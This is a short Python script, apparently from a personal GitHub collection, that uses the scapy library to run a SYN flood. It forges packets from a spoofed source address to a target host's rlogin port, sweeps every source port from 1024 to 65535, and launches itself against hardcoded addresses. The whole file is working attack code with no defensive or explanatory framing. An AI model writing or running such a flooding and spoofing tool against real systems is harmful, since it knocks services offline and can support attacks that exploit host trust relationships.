"""
========================================
Name:Recall Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2021-12-27
==================NACG==================
"""
from scapy.all import *
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        iplayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = iplayer/TCPlayer
        send(pkt)

src = "10.1.1.2"
tgt = "192.168.1.3"
synFlood(src, tgt)
